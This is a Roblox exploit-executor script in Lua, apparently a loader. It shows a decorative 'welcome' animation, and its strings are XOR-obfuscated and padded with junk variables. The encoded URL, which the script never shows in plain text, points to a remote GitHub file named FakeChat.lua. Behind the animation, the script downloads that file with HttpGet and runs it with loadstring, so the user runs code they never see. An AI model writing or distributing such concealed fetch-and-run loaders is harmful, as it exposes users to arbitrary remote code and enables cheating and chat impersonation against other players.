
local _G0 = game
local _S0 = string
local _T0 = table
local _B0 = bit32
local _P0 = pcall
local _W0 = task.wait
local _N0 = Instance.new

local _K0 = 73
local _R0 = 0
local _D0 = {}

local function _X0(_a, _k)
    local _o = {}
    for _i = 1, #_a do
        _o[_i] = _S0.char(_B0.bxor(_a[_i], _k))
    end
    return _T0.concat(_o)
end

local _U0 = _X0({
    33,61,61,57,58,115,102,102,59,40,62,103,46,32,61,33,
    60,43,60,58,44,59,42,38,39,61,44,39,61,103,42,38,36,
    102,61,39,63,40,39,46,102,1,38,42,37,40,36,58,42,59,
    32,57,61,102,36,40,32,39,102,15,40,34,44,10,33,40,61,
    103,37,60,40
}, _K0)

local _J0 = _G0:GetService("Players")
local _T1 = _G0:GetService("TweenService")
local _C0 = _G0:GetService("CoreGui")
local _P1 = _J0.LocalPlayer

local _F0 = _N0("ScreenGui")
_F0.Name = _X0({
    30,44,37,42,38,36,44,8,39,32,36,40,61,32,38,39
}, _K0)
_F0.IgnoreGuiInset = true
_F0.ResetOnSpawn = false
_F0.DisplayOrder = 999
_F0.Parent = _C0

local _F1 = _N0("Frame")
_F1.AnchorPoint = Vector2.new(0.5, 0.5)
_F1.Position = UDim2.fromScale(0.5, 0.43)
_F1.Size = UDim2.fromOffset(0, 100)
_F1.BackgroundColor3 = Color3.fromRGB(18, 16, 32)
_F1.BackgroundTransparency = 0.12
_F1.BorderSizePixel = 0
_F1.Parent = _F0

local _C1 = _N0("UICorner")
_C1.CornerRadius = UDim.new(0, 18)
_C1.Parent = _F1

local _S1 = _N0("UIStroke")
_S1.Thickness = 2
_S1.Transparency = 0.1
_S1.Color = Color3.fromRGB(255, 204, 90)
_S1.Parent = _F1

local _CS0 = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 195, 75)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 240, 190)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 115, 255))
})

local _G1 = _N0("UIGradient")
_G1.Color = _CS0
_G1.Parent = _S1

local _L0 = _N0("TextLabel")
_L0.BackgroundTransparency = 1
_L0.Position = UDim2.fromOffset(12, 12)
_L0.Size = UDim2.new(1, -24, 0, 42)
_L0.Font = Enum.Font.GothamBlack
_L0.Text = _X0({
    10,33,138,233,38,105,36,168,242,226,39,46
}, _K0)
_L0.TextSize = 28
_L0.TextColor3 = Color3.fromRGB(255, 225, 150)
_L0.TextTransparency = 1
_L0.Parent = _F1

local _G2 = _N0("UIGradient")
_G2.Color = _CS0
_G2.Parent = _L0

local _L1 = _N0("TextLabel")
_L1.BackgroundTransparency = 1
_L1.Position = UDim2.fromOffset(12, 54)
_L1.Size = UDim2.new(1, -24, 0, 25)
_L1.Font = Enum.Font.GothamMedium
_L1.Text = _X0({
    30,105,12,105,5,105,10,105,6,105,4,105,12
}, _K0)
_L1.TextSize = 15
_L1.TextColor3 = Color3.fromRGB(220, 205, 255)
_L1.TextTransparency = 1
_L1.Parent = _F1

local function _A0(_o, _d, _p, _s, _e)
    local _t = _T1:Create(
        _o,
        TweenInfo.new(
            _d,
            _s or Enum.EasingStyle.Quad,
            _e or Enum.EasingDirection.Out
        ),
        _p
    )
    _t:Play()
    return _t
end

local _junk1 = 7319
local _junk2 = "x" .. "q" .. "z"
local _junk3 = {17, 29, 43}
local _junk4 = _B0.bxor(125, 51)
local _junk5 = false

_A0(_F1, 0.65, {
    Size = UDim2.fromOffset(330, 100)
}, Enum.EasingStyle.Back)

_W0(0.3)
_A0(_L0, 0.6, {TextTransparency = 0})
_W0(0.2)
_A0(_L1, 0.6, {TextTransparency = 0})

task.spawn(function()
    while _F0.Parent do
        _A0(_G1, 2, {
            Rotation = 180
        }, Enum.EasingStyle.Linear)
        _W0(2)

        if not _F0.Parent then
            break
        end

        _A0(_G1, 2, {
            Rotation = 360
        }, Enum.EasingStyle.Linear)
        _W0(2)
    end
end)

_W0(2)

local _OK, _ERR = _P0(function()
    local _SRC = _G0:HttpGet(_U0)
    assert(type(_SRC) == "string" and #_SRC > 0,
        "Không tải được script")

    local _RUN = loadstring(_SRC)
    assert(type(_RUN) == "function",
        "Không thể biên dịch script")

    return _RUN()
end)

if not _OK then
    warn("[FakeChat] " .. tostring(_ERR))
end

_A0(_F1, 0.45, {
    Position = UDim2.fromScale(0.5, 0.38),
    BackgroundTransparency = 1
})

_A0(_L0, 0.35, {TextTransparency = 1})
_A0(_L1, 0.35, {TextTransparency = 1})
_A0(_S1, 0.35, {Transparency = 1})

_W0(0.5)

if _F0.Parent then
    _F0:Destroy()
end
